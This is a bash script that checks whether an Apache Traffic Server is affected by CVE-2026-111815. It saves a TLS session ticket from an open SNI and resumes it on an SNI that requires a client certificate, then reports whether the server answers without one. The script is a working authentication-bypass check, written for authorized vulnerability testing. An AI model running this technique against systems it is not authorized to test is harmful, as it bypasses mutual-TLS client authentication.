#!/bin/bash
# CVE-2026-111815 - Verify Apache Traffic Server lets a TLS session from a
# non-mTLS SNI resume on an SNI that requires a client certificate
# (verify_client STRICT), skipping client authentication.
#
# Demonstrates:
#   1. baseline: a fresh handshake to the STRICT SNI without a client cert fails
#   2. a session ticket is saved from the open SNI
#   3. resuming that ticket on the STRICT SNI (no client cert) is accepted
#      and the request is answered -> bypass
#
# Sends one harmless GET / per step. Run against lab/ first.
#
# Usage:
#   ./verify_ticket_bypass.sh HOST:PORT OPEN_SNI STRICT_SNI
#   ./verify_ticket_bypass.sh 127.0.0.1:28443 open.lab strict.lab
#
# For authorized security testing only.
set -u
HP=${1:?HOST:PORT}; OPEN=${2:?open SNI}; STRICT=${3:?strict SNI}
TMP=$(mktemp -d); trap 'rm -rf "$TMP"' EXIT
req() { printf 'GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n' "$1"; }

rc=2
for proto in -tls1_2 -tls1_3; do
  echo "== ${proto#-}"
  base=$(req "$STRICT" | timeout 10 openssl s_client -connect "$HP" -servername "$STRICT" $proto -ign_eof 2>&1)
  if grep -q '^HTTP/1\.[01] ' <<<"$base"; then
    echo "[?] STRICT SNI answered without a client cert on a fresh handshake: mTLS not enforced at all (config issue, not this CVE)"
    continue
  fi
  echo "[*] baseline: fresh handshake to $STRICT without client cert rejected"

  req "$OPEN" | timeout 10 openssl s_client -connect "$HP" -servername "$OPEN" $proto -sess_out "$TMP/s$proto" -ign_eof >/dev/null 2>&1
  if [ ! -s "$TMP/s$proto" ]; then echo "[-] no session saved from $OPEN (tickets/cache off?)"; continue; fi

  res=$(req "$STRICT" | timeout 10 openssl s_client -connect "$HP" -servername "$STRICT" $proto -sess_in "$TMP/s$proto" -ign_eof 2>&1)
  reused=$(grep -m1 -oE '^(Reused|New),' <<<"$res")
  status=$(grep -m1 -oE '^HTTP/1\.[01] [0-9]+' <<<"$res")
  echo "[*] resume on $STRICT: ${reused:-no handshake} ${status:-no HTTP response}"
  if [ "$reused" = "Reused," ] && [ -n "$status" ]; then
    echo "[+] VULNERABLE: resumed session reached $STRICT without a client certificate (CVE-2026-111815)"
    rc=1
  elif [ $rc -eq 2 ]; then
    rc=0
  fi
done
[ $rc -eq 0 ] && echo "[-] resumption did not bypass verify_client STRICT: NOT AFFECTED"
exit $rc
